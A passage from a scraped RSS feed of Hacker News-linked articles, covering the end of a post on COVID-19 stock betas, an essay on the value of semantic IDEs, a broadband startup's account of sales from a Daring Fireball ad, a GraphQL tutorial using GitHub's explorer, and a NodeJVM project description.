<p>On 9 November, while I was halfway through writing this post, Pfizer announced very promising results from their vaccine. I found the heatmap to be a very useful reference – the red companies/sectors posted stunning returns, while many of the blue companies (e.g big tech) had a lacklustre day – and actually ended up using the heatmap to help identify some stocks to trade. Based on my qualitative judgment post-hoc, the betas on the heatmap do seem to properly reflect the economic link between COVID-19 and the companies.</p>

<h2 id="conclusion">Conclusion</h2>

<p>In this post, we have constructed a “quick and dirty” method of understanding and visualising the effects of COVID-19 on different companies. There are several important caveats which should be considered before you use the heatmap for anything important.</p>

<p>Firstly, betas are essentially correlations, so we must be careful about using them to retroactively create narratives to explain <em>why</em> certain stocks did well/badly with respect to COVID-19. One must exercise judgment in determining which betas represent broad economic impacts due to COVID-19, rather than idiosyncratic company effects. For example, I noticed that within the financials sector, Goldman Sachs stood out as having a positive COVID beta – I reasoned that this was <em>because</em> GS doesn’t have significant commercial banking exposure, instead being focused on trading (which benefits from volatility) and investment banking. However, this narrative is somewhat contradicted by the fact that Morgan Stanley also lacks commercial banking exposure, yet had a negative COVID beta anyway.</p>

<p>Secondly, this analysis treats beta as if it is a static parameter. In reality, to compute beta (or any other time-series property), one must decide on a rolling window for the calculation. In this post, we used all year-to-date stock price data, but the plot below shows how the 2-month rolling beta for the 10 highest/lowest beta stocks (averaged) varied over time.</p>

<center>
<img src="https://reasonabledeviations.com/assets/images/covid_beta/rolling_beta.png">
</center>

<p>Lastly, we have all likely heard the many complaints about the market diverging from reality, along with the standard response that “markets are forward-looking”. Our methodology is not at all forward-looking, as it is simply …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://reasonabledeviations.com/2020/11/09/covid-beta/">https://reasonabledeviations.com/2020/11/09/covid-beta/</a></em></p>]]>
            </description>
            <link>https://reasonabledeviations.com/2020/11/09/covid-beta/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058503</guid>
            <pubDate>Wed, 11 Nov 2020 14:09:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why an IDE?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058502">thread link</a>) | @todsacerdoti
<br/>
November 11, 2020 | https://matklad.github.io//2020/11/11/yde.html | <a href="https://web.archive.org/web/*/https://matklad.github.io//2020/11/11/yde.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
  
  <p>Nov 11, 2020</p>
  <p>Some time ago I wrote a reddit comment explaining the benefits of IDEs.
Folks refer to it from time to time, so I decided to edit it into an article form.
Enjoy!</p>
<p>I think I have a rather balanced perspective on IDEs.
I used to be a heavy Emacs user (<a href="https://github.com/matklad/.emacs.d/tree/475de5db99f8729c57fed7e6fde4cd06f5ccb62f">old config</a>, <a href="https://github.com/matklad/config/blob/d555642a5a9e4e8b0ca0c77f188ffd976f06327c/home/.emacs.d/init.el">current config</a>).
I worked at JetBrains on <a href="https://github.com/intellij-rust/intellij-rust">IntelliJ Rust</a> for several years.
I used evil mode and vim for a bit, and tried tmux and kakoune.
Nowadays, I primarily use VS Code to develop <a href="https://github.com/rust-analyzer/rust-analyzer/">rust-analyzer</a>: LSP-based editor-independent IDE backend for Rust.</p>
<p>I will be focusing on IntelliJ family of IDEs, as I believe these are the most advanced IDEs today.</p>
<p>The main distinguishing feature of IntelliJ is semantic understanding of code.
The core of IntelliJ is a compiler which parses, type checks and otherwise understands your code.
<a href="https://martinfowler.com/bliki/PostIntelliJ.html">PostIntelliJ</a> is the canonical post about this.
That article also refutes the claim that “Smalltalk IDE is the best we’ve ever had”.</p>
<p>Note that “semantic understanding” is mostly unrelated to the traditional interpretation of “IDE” as <em>Integrated</em> Development Environment.
I personally don’t feel that the “Integrated” bit is all that important.
I commit&amp;push from the command line using Julia scripts, rebase in magit, and do code reviews in a browser.
If anything, there’s an ample room for improvement for the integration bits.
For me, <strong>I</strong> in “<strong>I</strong>DE” stands for “intelligent”, smart.</p>
<p>Keep in mind this terminology difference.
I feel it is a common source of misunderstanding.
“Unix and command line can do anything an IDE can do” is correct about integrated bits, but is wrong about semantical bits.</p>
<p>Traditional editors like Vim or Emacs understand programming languages very approximately, mostly via regular expressions.
For me, this feels very wrong.
It’s <a href="https://stackoverflow.com/a/1732454">common knowledge</a> that HTML shall not be parsed with regex.
Yet this is exactly what happens every time one does <code>vim index.html</code> with syntax highlighting on.
I sincerely think that almost every syntax highlighter out there is wrong and we, as an industry, should do better.
I also understand that this is a tall order, but I do my best to change the status quo here :-)</p>
<p>These are mostly theoretical concerns though.
The question is, does semantic understanding help in practice?
I am pretty sure that it is non-essential, especially for smaller code bases.
My <a href="https://github.com/matklad/rustraytracer">first non-trivial Rust program</a> was written in Emacs, and it was fine.
Most of rust-analyzer was written using pretty spartan IDE support.
There are a lot of insanely-productive folks who are like “sometimes I type vim, sometimes I type vi, they are sufficiently similar”.
Regex-based syntax highlighting and regex based fuzzy symbol search (<a href="https://github.com/universal-ctags/ctags">ctags</a>) get you a really long way.</p>
<p>However, I do believe that features unlocked by deep understanding of the language help.
The funniest example here is extend/shrink selection.
This features allows you to extend current selection to the next encompassing syntactic construct.
It’s the simplest feature a PostIntelliJ IDE can have, it only needs the parser.
But it is sooo helpful when writing code, it just completely blows vim’s text objects out of the water, especially when combined with multiple cursors.
In a sense, this is structural editing which works for text.</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98809232-80e3db00-241d-11eb-883a-5aece9a1dbfc.gif" alt="98809232 80e3db00 241d 11eb 883a 5aece9a1dbfc">
</p>
</div>
<p>If you add further knowledge of the language into a mix, you’ll get the “assists” system: micro-refactoring which available in a particular context.
For example, is the cursor is on a comma in a list of function arguments, you can <span><kbd>alt</kbd>+<kbd>enter</kbd></span> &gt; “swap arguments”, and the order of arguments will be changed in the declaration and on various call-sites as well.
(See <a href="https://rust-analyzer.github.io/blog/2020/09/28/how-to-make-a-light-bulb.html">this post</a> to learn how assists are implemented).</p>
<p>These small dwim things add up to a really nice editing experience, where you mostly express the intention, and the IDE deals with boring syntactical aspects of code editing:</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98812121-37e25580-2422-11eb-8541-2c5a32926845.gif" alt="98812121 37e25580 2422 11eb 8541 2c5a32926845">
</p>
</div>
<p>For larger projects, complex refactors are a huge time-saver.
Doing project-wide renames and signature changes automatically and without thinking reduces the cost of keeping the code clean.</p>
<p>Another transformative experience is navigation.
In IntelliJ, you generally don’t “open a file”.
Instead you think directly in terms of functions, types and modules, and navigate to those using file structure, goto symbol, to do definition/implementation/type, etc:</p>

<p>When I used Emacs, I really admired its buffer management facilities, because they made opening a file I want a breeze.
When I later switched to IntelliJ, I stopped thinking in terms of a set of opened files altogether.
I disabled editor tabs and started using editor splits less often — you don’t need bookmarks if you can just find things.</p>
<p>For me, there’s one aspect of traditional editors which is typically not matched in IDEs out of the box — basic cursor motion.
Using arrow keys for that is slow and flow-breaking, because one needs to move the hand from the home row.
Even Emacs' horrific <kbd>C-p</kbd>, <kbd>C-n</kbd> are a big improvement, and vim’s <kbd>hjkl</kbd> go even further.
One fix here is to configure each tool to use your favorite shortcuts, but this is a whack-a-mole game.
What I do is remapping <kbd>CapsLock</kbd> to act as an extra modifier, such that <kbd>ijkl</kbd> <strong>are</strong> arrow keys.
(There are also keyboards with <a href="https://ultimatehackingkeyboard.com/">hardware</a> <a href="https://ergodox-ez.com/">support</a> for this).
This works in all applications the same way.
Easy motion / ace jump functionality for jumping to any visible character is also handy, and usually is available <a href="https://plugins.jetbrains.com/plugin/9803-acejump-lite">via</a> <a href="https://marketplace.visualstudio.com/items?itemName=lucax88x.codeacejumper">a plugin</a>.</p>
<p>Recent advancements with LSP protocol promise to give one the best of both worlds, where semantic-aware backend and light-weight editor frontend are different processes, which can be mixed and matched.
This is nice in theory, but not as nice in practice as IntelliJ yet, mostly because IntelliJ is way more polished.</p>
<p>To give a simple example, in IntelliJ for “go to symbol by fuzzy name” functionality, I can filter the search scope by:</p>
<div>
<ul>
<li>
<p>is this my code/code from a dependency?</p>
</li>
<li>
<p>is this test/production code?</p>
</li>
<li>
<p>is a symbol a type-like thing, or a method-like thing?</p>
</li>
<li>
<p>path to the module where the symbol is defined.</p>
</li>
</ul>
</div>
<p>VS Code and LSP simply do not have capabilities for such filters yet, they have to be bolted on using hacks.
Support for LSP in other editors is even more hit-and-miss.</p>
<p>LSP did achieve a significant breakthrough — it made people care about implementing IDE backends.
Experience shows that re-engineering an existing compiler to power an IDE is often impossible, or isomorphic to a rewrite.
How a compiler talks to an editor is the smaller problem.
The hard one is building a compiler that can do IDE stuff in the first place.
Check out <a href="https://rust-analyzer.github.io/blog/2020/07/20/three-architectures-for-responsive-ide.html">this post</a> for some of the technical details.
Starting with this use-case in mind saves a lot of effort down the road.</p>
<p>This I think is a big deal.
I hypothesize that the reason why IDEs do not completely dominate tooling landscape is the lack of good IDE backends.</p>
<p>If we look at the set of languages fairly popular recently, a significant fraction of them is dynamically typed: PHP, JavaScript, Python, Ruby.
The helpfulness of an IDE for dynamically typed languages is severely limited: while approximations and heuristics can get you a long way, you still need humans in the loop to verify IDE’s guesses.</p>
<p>There’s C++, but its templates are effectively dynamically typed, with exactly the same issues (and a very complex base language to boot).
Curiously, C looks like a language for which implementing a near-perfect IDE is pretty feasible.
I don’t know why it didn’t happen before CLion.</p>
<p>This leaves C# and Java.
Indeed, these languages are dominated by IDEs.
There’s a saying that you can’t write Java without an IDE.
I think it gets the causation direction backwards: Java is one of the few languages for which it is possible to implement a great IDE without great pain.
Supporting evidence here is Go.
According to <a href="https://blog.golang.org/survey2019-results#TOC_5.">survey results</a>, text editors are stably declining in popularity in favor of IDEs.</p>
<p>I think this is because Go actually has good IDEs.
This is possible because the language is sufficiently statically typed for an IDE to be a marked improvement.
Additionally, the language is very simple, so the amount of work you need to put in to make a decent IDE is much lower than for other languages.
If you have something like JavaScript…​
Well, you first need to build an alternative language for which you can actually implement an IDE (<a href="https://www.typescriptlang.org/">TypeScript</a>) and only then you can build the IDE itself (<a href="https://github.com/microsoft/vscode">VS Code</a>).</p>
</article>

  </div></div>]]>
            </description>
            <link>https://matklad.github.io//2020/11/11/yde.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058502</guid>
            <pubDate>Wed, 11 Nov 2020 14:09:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[$200k in sales from a $6k advertisement]]>
            </title>
            <description>
<![CDATA[
Score 383 | Comments 104 (<a href="https://news.ycombinator.com/item?id=25058363">thread link</a>) | @mildlyclassic
<br/>
November 11, 2020 | https://www.wifidabba.com/blog/200000-dollars-in-sales-from-one-daringfireball-ad | <a href="https://web.archive.org/web/*/https://www.wifidabba.com/blog/200000-dollars-in-sales-from-one-daringfireball-ad">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
      <div>
        <div>
          <div>


          
            <table>
                <thead>
                  <tr>
                    <th>
                      Metric
                    </th>
                    <th>
                      Count
                    </th>
                  </tr>
                </thead>
                <tbody>
                <tr data-href="#!">
                    <td>
                      Time period
                    </td>
                    <td>
                      Aug 17,2020 - Aug 24,2020
                    </td>
                  </tr>
                  <tr data-href="#!">
                    <td>
                      Visitors
                    </td>
                    <td>
                      7,200
                    </td>
                  </tr>
                  <tr data-href="#!">
                    <td>
                      Emails
                    </td>
                    <td>
                      45
                    </td>
                    
                  </tr>
                  <tr data-href="#!">
                    <td>
                      Video calls
                    </td>
                    <td>
                      30
                    </td>
                    
                  </tr>
                  <tr data-href="#!">
                    <td>
                      <strong>Units sold</strong>
                    </td>
                    <td>
                      <b>10</b>
                    </td>
                  </tr>   
                  <tr data-href="#!">
                    <td>
                      <strong>Unit price</strong>
                    </td>
                    <td>
                      <b>$20,000</b>
                    </td>
                  </tr>
                  <tr data-href="#!">
                    <td>
                      <strong>Total revenue from DF</strong>
                    </td>
                    <td>
                      <b>$200,000</b>
                    </td>
                  </tr>
                  
                </tbody>
              </table>
              
              
          <ul>
              <li>
                Build cheap broadband distribution technology.
              </li>
              <li>
                Prove the tech works by connecting 1M people in one city.
              </li>
              <li>
                Deploy across 1,000 cities in India
              </li>
            </ul>

            

            <p>
                Our goal at <a href="https://www.wifidabba.com/">Wifi Dabba</a> is to lower the cost of broadband access in India. We use lasers instead of underground fiber as our core network and commodity components to dramatically lower the cost of deploying a broadband network.
            
                We've been running a beta network in Bengaluru, India for the last 9 months serving thousands of live customers. We're now ready to deploy a city wide network and provide cheap internet access to a million people.
            </p>

            <iframe width="100%" height="450" src="https://www.youtube.com/embed/LwVWJXBNQg8?autoplay=1" srcdoc="<style>*{padding:0;margin:0;overflow:hidden}html,body{height:100%}img,span{position:absolute;width:100%;top:0;bottom:0;margin:auto}span{height:1.5em;text-align:center;font:48px/1.5 sans-serif;color:white;text-shadow:0 0 0.5em black}</style><a href=https://www.youtube.com/embed/LwVWJXBNQg8?autoplay=1><img width='100%' style='min-height:250px;' src='https://img.youtube.com/vi/LwVWJXBNQg8/hqdefault.jpg' alt='Wifi Dabba overview'><span>▶</span></a>" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="Wifi Dabba overview"></iframe>

            
            <p>
              A core tenet of the Wifi Dabba network is distributed ownership. We believe that ownership of the internet should be in the hands of as many people as possible. If the cost of broadband tech drops, then more people can help pay for the cost of the network.
              And if you're one of the people paying for the distribution, we believe you should get revenue in return.
            </p>

            <p>
              We've divided the city of Bengaluru into 100 regions called PoPs. Anyone can buy a region and get a share in the revenue from those subscribers. 
            </p>

            <p>
              The Wifi Dabba franchise model:
            </p>

            <ul>
              <li>
                <strong>$20,000</strong> to purchase a 4sqkm. PoP.
              </li>
              <li>
                <strong>Minimum guaranteed revenue</strong> Paid quarterly with a 6 year rev share agreement.
              </li>
              <li>
                <strong>Fully managed service</strong> Be an absentee landlord
              </li>
            </ul>

            

            <p>
              <span>We've sold 40 as of the time of writing this.</span>
              <br>
              
              Wifi Dabba is insanely lucky for the amount of public support we have as a company. We regularly get phone calls, emails and even people dropping by our office just to tell us they like our service. Over the last 3 years we've received dozens of emails from people requesting franchises or other types of partnerships.
              We're incredibly humbled and thankful for this support on a daily basis.
            </p>

            
            <p>
              We believe there is a large group of people that care about the future of the internet and would be willing to put their money where their mouths are. As long as the price and the level of risk involved is reasonable.
              Our gut told us that this group would most likely be people that have seen success in the technology business as engineers, operators and entreprenuers.
            </p>

            
            <p>
              We've had our heads down over the last three years building and testing our network stack. Publicity or notariety has never been high on our list. 
              We've begun ramping up our social media efforts but it was clear that to kickstart our outreach, we had to do a little bit of advertising.
            </p>

            
            
              <p><img src="https://www.wifidabba.com/images/df-venn.png" height="300" width="330" alt="...">
                <br>
              </p>
            <p>
              <a href="https://www.daringfireball.net/">Daringfireball.net</a> is a great blog authored by <a href="https://en.wikipedia.org/wiki/John_Gruber">John Gruber</a> who is also the creator of <a href="https://daringfireball.net/projects/markdown/">Markdown</a>.
              DF was a natural choice for us as we've been readers of the blog for a long while and we knew from experience that DF readers would fit our target market rather well. Given the high quality of John's writing and insights into the industry, we felt that there would be a large pool of senior tech veterans that would be interested in Wifi Dabba among DF's audience.
            </p>

            <p>
                The sponsorship cost us $6,500 and ran for the week starting Aug 17, 2020 and we got:
                </p><ul>
                <li>
                  A display ad in the sidebar on every page of the site, all week long.
                </li>
                <li>
                  A post from the sponsor in the RSS feed at the start of the week. Us, the sponsor, got to address Daring Fireball’s most dedicated readers directly.
                </li>
                <li>
                  At the end of the week, John also posts an item thanking and linking to the feed sponsor.
                </li>
              </ul>
            

            <p>
                Stats about DF readership
                </p><ul>
                <li>
                Typical weekday web page views: 80,000–100,000.
                </li>
                <li>
                Estimated monthly web page views: 2.5 million.
                </li>
                <li>
                Estimated Daring Fireball RSS feed subscribers: Over 200,000.
                </li>
                <li>
                Twitter followers on the @daringfireball  account: Over 92,000.
                </li>
              </ul>
            
            

            
            <p>
                We created two variants of our message. Designed in bold colours to stand out against DF's dark theme. These creatives rotated randomly.
                We decided to focus on the technology because of the nature of the audience and hoped that the website did a good job of explaining the product.  
                </p><p><img src="https://www.wifidabba.com/images/df-ads.png" width="100%" alt="Buy internet POP">
                </p>
            

            
            <div>
                <p><strong>Click Ad -&gt; Browse site -&gt; Setup a call</strong></p><p>

                We expected visitors to click on the ad in DF and land on our homepage. Once on our site, we hoped that visitors would check out our videos as well as browse through a few pages.
                If they liked what they saw, we had a prominent buy button on the front page which led to a page to setup a video call.
            </p></div>

            <p>
                It's worth noting here that we knew going in that a large percentage of DF's audience would be using Ad-blockers. Nothing wrong with that, we use ad-blockers ourselves.
            </p>

            <p>
              Furthermore, we made a deliberate choice to add a high friction call to action and contact process. In order to purchase a PoP, a visitor would be directed to a calendar managed by calendly that would help them setup a call with someone from our team at a convenient time.
            </p>
            <p><a href="https://wifidabba.com/buy">
              <img width="100%" src="https://www.wifidabba.com/images/df-buy.png" alt="Setup Call">
            </a></p><p>
              The reason for this is that we knew DF would deliver a few hundred visitors a day to our site. We're a small team and our core focus is deploying the network, not necessarily sales and our goal is to sell the PoPs to people that are really excited a lot about our idea and show a high level of interest.
              The $20,000 price point of our product + the high friction of the contact process + users that are OK with ads = A high signal to noise ratio from DF visitors. 
              We'd love to hear any feedback on what you think about this.
            </p>

            
              

              <p>
                Our thesis turned out to be pretty spot on. Senior engineers from Google, Apple and a host of other technology companies purchased the PoPs.
                The actual sales process turned out to be fairly quick and straight forward. Most of the people that purchased the PoPs did so within a period of 48 hours of having the call.
              </p>

              



          </div>
        </div>
    </div>
    </section></div>]]>
            </description>
            <link>https://www.wifidabba.com/blog/200000-dollars-in-sales-from-one-daringfireball-ad</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058363</guid>
            <pubDate>Wed, 11 Nov 2020 13:51:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Executing GraphQL Queries]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058361">thread link</a>) | @chmaynard
<br/>
November 11, 2020 | https://jemma.dev/blog/executing-graphql-queries | <a href="https://web.archive.org/web/*/https://jemma.dev/blog/executing-graphql-queries">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><a href="https://graphql.org/">GraphQL</a> is surging in popularity as a preferred choice for APIs over REST APIs. One of the reasons many companies cite for converting their APIs from REST to GraphQL is its ease of use. If you know JSON, GraphQL is incredibly intuitive. And there are helpful tools like <a href="https://github.com/graphql/graphiql">GraphiQL</a>, an in browser GraphQL IDE.</p>

<p>Even with its usability, there are still a few pointers which are helpful to learning GraphQL. GitHub implemented their <a href="https://developer.github.com/v4/">API v4</a> using GraphQL. Let’s work through an example using <a href="https://developer.github.com/v4/explorer/">GitHub’s GraphiQL explorer</a> to hit the GitHub API as a way to learn some basic GraphQL:</p>

<h3 id="graphiql-keyboard-shortcuts">GraphiQL Keyboard Shortcuts</h3>

<p>Before we start, take a look at these keyboard shortcuts I frequently use when working in the GraphiQL IDE:</p>

<ul>
  <li>Auto Complete: Ctrl-Space (or Option-Space)</li>
  <li>Run query: Ctrl-Enter</li>
  <li>Format query: Ctrl-Shift-P</li>
</ul>

<h3 id="githubs-graphiql-explorer">GitHub’s GraphiQL Explorer</h3>

<p>When you open up <a href="https://developer.github.com/v4/explorer/">GitHub’s GraphiQL explorer</a>, you’ll see three panes. The top left is a query editor for our GraphQL query to GitHub’s API; bottom left is for query variables; and the right side will display query results when we hit the API.</p>

<p>After signing in with your GitHub account details, Hit play (Ctrl-Enter) on the query which GitHub autofills! You’ll see your login displayed on the right side of the screen. The first item to note here is that the result mirrors the syntax and format of the query. This is a big part of what makes GraphQL so intuitive! The API responses mirror the API requests.</p>

<h3 id="reading-the-docs">Reading the Docs</h3>

<p>Towards the right of the GraphiQL explorer, there’s a <code>&lt; Docs</code> button. Toggle it! (This is not to be confused with the topbar menu <code>Docs</code> dropdown.) The <code>&lt; Docs</code> will toggle a little interface which tells us what to expect in our queries, and helps us when we use incorrect syntax. It will let us search by type.</p>

<p>Your first question, though, might be, how will we know the type of our data? In GraphQL, we can use <code>__typename</code> on any data to get its type. For instance, we can edit the query we just wrote:</p>

<div><div><pre><code>query <span>{</span>
  viewer <span>{</span>
    __typename
  <span>}</span>
<span>}</span>
</code></pre></div></div>
<p>and we’ll see that <code>viewer</code> has the type <code>"User"</code>. If we now search the docs for <code>"User"</code>, we’ll see there are many <code>"Fields"</code> on user which we can explore. Try adding a few fields to your initial query.</p>

<h3 id="user">User</h3>

<p>Well, there must also be other <code>"User"</code>s we can access instead of just ourselves. Let’s try it! Replace <code>viewer</code> in the query from above with <code>user</code>. When we run this snippet, we’ll see an error:</p>

<div><div><pre><code>query <span>{</span>
  user <span>{</span>
    name
    login
    createdAt
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The error will appear on our right pane. The error message tells us our problem, <code>"Field 'user' is missing required arguments: login"</code> Ah! We haven’t told GraphQL <em>which</em> user we’re interested in. As it suggests, let’s pass in a user’s login. <a href="https://github.com/torvalds">Linus Torvalds</a> created git, so he seems like an appropriate user to play with. His login is <code>torvalds</code>:</p>

<div><div><pre><code>query <span>{</span>
  user<span>(</span>login: <span>"torvalds"</span><span>)</span> <span>{</span>
    name
    login
    createdAt
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Neat. On the right side of your screen you should see that he’s had a GitHub account since 2011.</p>

<h3 id="connections">Connections</h3>

<p>When looking at the <code>User</code> docs, you might have noticed a type suffixed with <code>"Connection"</code>, for instance, <code>followers</code> has type <code>"FollowerConnection"</code>.</p>

<p>In GraphQL, <code>User</code> is a <code>Node</code>. Nodes have edges, and lists of these edges are called <code>Connections</code>. A <code>Connection</code> is a way to see all nodes that are connected to a certain node in a specific way. In our case, we’re looking for all <code>followers</code> nodes which are connected to Linus Torvalds. (See <a href="https://www.apollographql.com/blog/explaining-graphql-connections-c48b7c3d6976/">this Apollo blog post</a> for further reading about connections.)</p>

<p>If we try typing <code>followers</code> in the query, GraphiQL will give us an indication of an error. Hovering, we can read the error message, saying that <code>followers</code> must have a selection of subfields. This is where GraphiQL is incredibly helpful. Hit run (Ctrl-enter) after typing <code>followers</code>, and GraphiQL will autocomplete what its asking for:</p>

<div><div><pre><code>query <span>{</span>
  user<span>(</span>login: <span>"torvalds"</span><span>)</span> <span>{</span>
    name
    login
    createdAt
    followers <span>{</span>
      edges <span>{</span>
        node <span>{</span>
          <span>id</span>
        <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>GraphiQL has auto-filled in the <code>edges</code>, <code>node</code> and <code>id</code> field on <code>followers</code> as defaults to give us some data about Linus’ followers. This makes sense given what we know about edges and nodes: followers has <code>edges</code> and each of these is a <code>node</code>.</p>

<p>But, if we look to the right side of our screen, we’ll see we have an error instead of results. The type <code>"MISSING_PAGINATION_BOUNDARIES"</code> and message <code>"You must provide a 'first' or 'last' value to properly paginate the 'followers' connection."</code> are both helpful here.</p>

<p>One of GraphQL’s real features is that it never returns more data than you ask it for. That said, we must tell it exactly how much data we want, by using (as prompted), the <code>first</code> or <code>last</code> field to limit the number of followers we’re asking for. Let’s look at Linus’ last 5 followers:</p>

<div><div><pre><code>query <span>{</span>
  user<span>(</span>login: <span>"torvalds"</span><span>)</span> <span>{</span>
    name
    login
    createdAt
    followers<span>(</span>last: 5<span>)</span> <span>{</span>
      edges <span>{</span>
        node <span>{</span>
          <span>id</span>
        <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This worked! But the <code>id</code>s aren’t particularly informative. We can see the type of <code>followers</code> by again using <code>__typename</code>. Or, we can use Ctrl-space to autoprompt some fields we might be interested in. Instead of the <code>id</code> field on a <code>node</code>, let’s look at <code>name</code>:</p>

<div><div><pre><code>query <span>{</span>
  user<span>(</span>login: <span>"torvalds"</span><span>)</span> <span>{</span>
    name
    login
    createdAt
    followers<span>(</span>last: 5<span>)</span> <span>{</span>
      edges <span>{</span>
        node <span>{</span>
          name
        <span>}</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Aha, we can see the name of a few of Linus’ followers. But, exactly how popular is he? For that, we can use the <code>totalCount</code> field under <code>followers</code>:</p>

<div><div><pre><code>query <span>{</span>
  user<span>(</span>login: <span>"torvalds"</span><span>)</span> <span>{</span>
    name
    login
    createdAt
    followers<span>(</span>last: 5<span>)</span> <span>{</span>
      totalCount
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>As of the writing of this post, he has 124,812 followers. Notably, <code>totalCount</code> was <em>not</em> limited by our pagination. This is because it is only returning a single value, not a series of values.</p>

<h3 id="query-variables">Query Variables</h3>

<p>Reading this, you might have been curious how many followers a different user has. For that, we could replace <code>"torvalds"</code> with a different user’s login. Or, we could learn about Query Variables!</p>

<p>This is the last remaining pane (on the bottom left) which we haven’t touched yet.</p>

<p>We first need to declare the argument within our query. GraphQL requires a type here. We’ll need to declare it in two places. The first is passing it into the query itself. The syntax is <code>query ($variable_name:type!) { ...</code> In our case, we want to pass a <code>login</code> of type <code>String</code>, so <code>query ($login:String!) {...</code>. Secondly, we want this to be our user’s login. So we can replace <code>torvalds</code> with <code>$login</code> as follows:</p>

<div><div><pre><code>query <span>(</span><span>$login</span>:String!<span>)</span> <span>{</span>
  user<span>(</span>login: <span>$login</span><span>)</span> <span>{</span>
    name
    followers<span>(</span>last: 5<span>)</span> <span>{</span>
     totalCount
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>If we run this, our error message tells us that <code>"Variable $login of type String! was provided invalid value"</code>! Ah! We still didn’t use our bottom left “Query Variables” pane. Let’s fill it in. Again, we can use the Ctrl-space to help us out: <code>{"login": "jemmaissroff"}</code>. If we now hit run, we’ll see (among other things) that I have <em>significantly</em> fewer followers than Linus Torvalds.</p>

<h3 id="tldr">TL;DR</h3>

<p>For those short on time or attention:</p>

<ul>
  <li>GraphQL query results mirror JSON, making them easy to parse, write and reason about</li>
  <li><a href="https://github.com/graphql/graphiql">GraphiQL</a> is a helpful GraphQL IDE</li>
  <li><code>__typename</code> gives the type of an item, helpful for reading the docs</li>
  <li>Some queries have required arguments to limit the scope of a search, like <code>login</code> for user</li>
  <li>Pagination is a feature of GraphQL, requiring us to limit our queries, sometimes using <code>first</code> or <code>last</code></li>
  <li>Query variables must have a type and be named in the query declaration</li>
  <li>Query variables then can be used throughout the query itself by referencing the name in the declaration</li>
</ul>

<p>For an example of a queries which uses a few additional features of GraphQL, check out the queries I wrote <a href="https://github.com/jemmaissroff/find_github_email/blob/main/lib/find_github_email/queries.rb">here</a> for a Ruby gem to <a href="https://github.com/jemmaissroff/find_github_email">find GitHub users’ emails</a>.</p>


  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://jemma.dev/blog/executing-graphql-queries</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058361</guid>
            <pubDate>Wed, 11 Nov 2020 13:50:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NodeJVM]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25058252">thread link</a>) | @mooreds
<br/>
November 11, 2020 | https://mikehearn.github.io/nodejvm/ | <a href="https://web.archive.org/web/*/https://mikehearn.github.io/nodejvm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        
      
      
      <main role="main">
        <div data-md-component="container">
          
            
              
            
            
              
            
          
          <div>
            <article>
              
                
                  <a href="https://github.com/mikehearn/nodejvm/edit/master/docs/index.md" title="Edit this page"></a>
                
                
                
<p>This repository demonstrates how to use NodeJS/npm modules directly from Java and Kotlin. Why is it useful:</p>
<ul>
<li>Gain access to unique JavaScript modules, like the Dat peer to peer file sharing framework shown in the samples.</li>
<li>Combine your existing NodeJS and Java servers together, eliminating the overheads of REST, serialisation, two separate
  virtual machines. Simplify your microservices architecture into being a polyglot architecture instead.</li>
<li>Use it to start porting NodeJS apps to the JVM world and languages, incrementally, one chunk at a time, whilst always
  having a runnable app. Or do the reverse.</li>
</ul>
<h2 id="how-does-it-work">How does it work?<a href="#how-does-it-work" title="Permanent link">¶</a></h2>
<p><a href="https://www.graalvm.org/">GraalVM</a> is a modified version of OpenJDK that includes the cutting edge Graal and Truffle compiler infrastructure.
It provides an advanced JavaScript engine that has competitive performance with V8, and also a modified version of
NodeJS 10 that swaps out V8 for this enhanced JVM. In this way you can fuse together NodeJS and the JVM, allowing apps
to smoothly access both worlds simultaneously with full JIT compilation.</p>
<h2 id="known-limitations">Known limitations<a href="#known-limitations" title="Permanent link">¶</a></h2>
<p>NodeJS really wants to load module files from the filesystem and nowhere else, so your Java app will need a <code>node_modules</code>
directory from where it's started. There are tricks to work around this and allow bundling of JS into JAR files as
libraries, but nothing done at the moment.</p>
<p>GraalVM uses NodeJS 10, not the latest versions.</p>
<p>You change <code>java</code> on the command line to <code>nodejvm</code> and that's all it needs, but many tools and IDEs expect the java
launcher to always be called <code>java</code>.  </p>
                
                  
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        

      
    </div></div>]]>
            </description>
            <link>https://mikehearn.github.io/nodejvm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25058252</guid>
            <pubDate>Wed, 11 Nov 2020 13:36:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Headless E-Commerce and Jamstack]]>
